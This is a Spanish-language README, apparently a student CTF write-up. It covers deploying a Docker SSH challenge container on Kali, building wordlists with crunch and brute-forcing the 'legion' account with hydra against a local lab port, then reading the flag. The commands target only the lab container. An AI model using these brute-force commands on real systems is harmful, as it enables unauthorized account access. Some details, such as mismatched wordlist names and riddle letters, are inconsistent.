<h1 align="center"><img width="225" height="225" alt="image" src="https://github.com/user-attachments/assets/5fcb053c-bac4-4d4e-89b3-d76a25b7ca46" /></h1>
<h1 align="center"> :rotating_light::bulb: CTF Docker Hub – Usuario 'legion' :bulb::rotating_light: </h1> 
<h1 align="center"><img width="1200" height="414" alt="image" src="https://github.com/user-attachments/assets/1ca295c0-977c-41b6-a724-16d57793c255" /></h1>

# :eight_spoked_asterisk: **Rubén Contreras Caballero**
# :eight_spoked_asterisk: **Johan Martínez Rojas**
# :eight_spoked_asterisk: **Mauricio Gómez Rodríguez**

El reto CTF (Capture The Flag) de Docker Hub dirigido al usuario 'legion', es un ejercicio práctico y gamificado orientado a la seguridad informática y a la administración de contenedores Docker usando Kali Linux como entorno de pruebas.

# Propósito y objetivo
:triangular_flag_on_post: **Simular un entorno realista de hacking ético:** el reto prepara escenarios que desafían la capacidad del participante para explorar, identificar, vulnerar y mitigar servicios en un entorno contenido, permitiendo aprender técnicas de pentesting legal y seguro.

:triangular_flag_on_post: Enseñar el manejo profesional de herramientas de ciberseguridad en infraestructuras modernas, empleando contenedores y automatización reproducible de laboratorios.

:triangular_flag_on_post: Promover el razonamiento forense/técnico y la documentación detallada, útil en auditorías y peritajes digitales.

| 🛠️ **Fase**                            | 📄 **Actividades principales**                                                                                                                                                                                                                       |
|-----------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 🚀 **1. Despliegue y preparación**      | - Descargar el archivo/laboratorio desde el repositorio.<br>- Copiarlo a la máquina virtual con Kali Linux.<br>- Instalar Docker (si no está presente).<br>- Desplegar servicios y retos mediante scripts.<br>- Crear el contenedor en la red interna (ej. 172.17.0.0/24).                  |
| 🌐 **2. Reconocimiento y mapeo**        | - Identificación de hosts activos con `netdiscover`.<br>- Exploración de puertos y servicios (`nmap`) en el entorno Docker (SSH, HTTP, etc.).                                                                                                       |
| 🔎 **3. Enumeración y credenciales**    | - Fuzzing con `gobuster` para descubrir directorios/archivos.<br>- Recolección de usuarios (carlota, juan, legion).<br>- Obtención de pistas para la fase de explotación.                                                                         |
| 💥 **4. Explotación y escalada**        | - Ataque de contraseñas sobre SSH (`hydra`) para acceso legítimo.<br>- Descarga y análisis de evidencia digital (`scp`, `steghide`).<br>- Escalada de privilegios y análisis forense (`su`, `sudo`, análisis de archivos protegidos).               |
| 📝 **5. Documentación y reporte**       | - Registro de comandos, hallazgos y pasos del proceso.<br>- Elaboración de informe tipo README.<br>- Cumplimiento de trazabilidad, cadena de custodia y marco técnico/jurídico.                                                                    |

| 🧩 **Aspectos clave**            | ✍️ **Descripción**                                                                                                                                                  |
|----------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 🐳 Docker                        | Creación y gestión de entornos aislados para pruebas y retos reproducibles.                                                                                        |
| 🦾 Seguridad Linux/Kali          | Uso de herramientas éticas de hacking y análisis forense avanzado.                                                                                                |
| 🔏 Forense digital               | Extracción y análisis de archivos ocultos; custodia y validez técnica/jurídica de evidencia.                                                                      |
| 🗝️ Escalada de privilegios       | Aplicación/detección de técnicas ofensivas para mejora de políticas y seguridad en usuarios y administración de sistemas Linux.                                   |

| 🎯 **Perfil/aprendizaje esperado**                   | 🎓 **Beneficios formativos**                                                                                                                              |
|------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 👨‍💻 Estudiantes, profesionales TI, abogados TIC      | - Comprensión integral de fases de ataque-defensa en entornos Docker.<br>- Práctica en recolección de evidencia digital legalmente válida.<br>- Mejora de capacidades para documentación técnica, compliance y análisis jurídico de incidentes.<br>- Fortalecimiento de ética y conocimientos actualizados en ciberseguridad y respuesta técnica.       |

<h1 align="center"> :rotating_light::bulb: DESARROLLO :bulb::rotating_light: </h1> 



## :one: Introducción
Este informe documenta el proceso para resolver un reto CTF en Docker consistente en acceder mediante SSH a un contenedor Ubuntu con el usuario 'legion'. La metodología incluye la interpretación de pistas para deducir la contraseña, la configuración del laboratorio, la generación de diccionarios personalizados y el uso de Hydra para realizar ataques de fuerza bruta, todo con enfoque técnico y práctico, adecuado para ambientes de formación y auditorías de ciberseguridad.

## :two: Descripción del Escenario
Entorno: Contenedor Docker basado en Ubuntu.

Usuario objetivo: legion

Acceso buscado: Contraseña de legion vía SSH (puerto redirigido, típicamente 2222).

Herramientas utilizadas: Crunch, Hydra, SSH, Docker.

## :three: Configuración y Preparación del Entorno
A. Obtención y transferencia del laboratorio
Descargar desde el repositorio de trabajo el paquete del reto.

- Transferir el archivo comprimido al entorno Kali Linux con:

```bash
scp usuario@host:~/Descargas/reto-legion.zip ~/reto/
```
Descomprimir y ubicar los archivos necesarios:

```bash
unzip reto-legion.zip
cd reto-legion/
```
B. Instalación y despliegue del contenedor
Instalar Docker si es necesario:

```bash
sudo apt update && sudo apt install docker.io
```
Ejecutar el contenedor exponiendo el puerto SSH:

```bash
docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0
```
<img width="560" height="70" alt="image" src="https://github.com/user-attachments/assets/f34f0626-a730-43eb-958a-6b1518aad163" />

Verificar estado del contenedor y la red Docker:

```bash
docker ps
ip a
```
## :four: Resolución de la Contraseña a través de Enigmas
El reto presenta un acertijo en el que cada línea aporta indicios sobre una letra de la contraseña, todas relacionadas con palabras clave específicas. El análisis cuidadoso de cada pista permite construir el posible password, valorando sinónimos, fonética y posiciones en palabras dadas.

Ejemplo básico de razonamiento:

Primera letra: aparece en “esfera” → “e”

Segunda letra: contenida en “pasto” → “a”

Siguientes: determinar patrones o aparición en palabras sugeridas.

Última: suena como final de “sol” → “l”

De este modo, se construye una contraseña probable que se verificará experimentalmente.

## :five: Generación de Diccionarios con Crunch
Para abarcar variantes de la contraseña, se crea un diccionario adaptado con reglas impuestas por el acertijo:

```bash
crunch 5 5 -t E@@G* -o lista.txt
```
<img width="500" height="156" alt="image" src="https://github.com/user-attachments/assets/cfd3c103-b3ed-4764-9aae-4e9c75b20417" />

-t E@@G* define una máscara que varía posiciones intermedias y añade flexibilidad a la búsqueda.

O bien, para cubrir combinaciones alfabéticas:

```bash
crunch 5 5 -f /usr/share/crunch/charset.lst alpha -o lista-completa.txt
```

Se recomienda personalizar la máscara para enfocarse en posibles letras identificadas en el análisis del acertijo.

## :six: Ataque de Fuerza Bruta con Hydra
Una vez listo el diccionario, se ejecuta Hydra para automatizar el ataque contra SSH, empleando el usuario objetivo y el archivo de contraseñas:

```bash
hydra -l legion -P lista.txt ssh://localhost -s 2222
```
<img width="589" height="269" alt="image" src="https://github.com/user-attachments/assets/93bcd1f3-2085-474c-9005-78bf40a0589b" />

Donde:

-l legion define el usuario a atacar.

-P posibles.txt es la ruta del diccionario.

ssh://localhost -s 2222 conecta al servicio SSH dockerizado.

Se espera que Hydra muestre el intento exitoso indicando la contraseña válida hallada en el diccionario.

## :seven: Acceso SSH y Obtención de la Bandera
Con la contraseña obtenida, se accede al contenedor:

```bash
ssh legion@localhost -p 2222
```
Una vez en la terminal remota, se navega para encontrar la flag o el archivo de validación del reto:

```bash
ls
cat flag.txt
```

## :eight: Recomendaciones y Buenas Prácticas
Documentar claramente cada comando y hallazgo relevante para asegurar la trazabilidad y facilitar auditorías externas.

Cambiar periódicamente las credenciales por defecto o evidentes en contenedores expuestos.

Integrar técnicas de análisis forense digital para casos en los que la flag quede protegida por varios niveles de seguridad.

## :nine: Conclusión
Este informe presenta una estrategia alternativa para la resolución del reto CTF orientado al acceso por SSH en un contenedor Docker. Se enfatiza el análisis lógico del acertijo, la creación racional de diccionarios personalizados y el uso sistemático de las herramientas de pentesting de manera documentada y reproducible para maximizar el aprendizaje y la robustez de las prácticas de ciberseguridad.



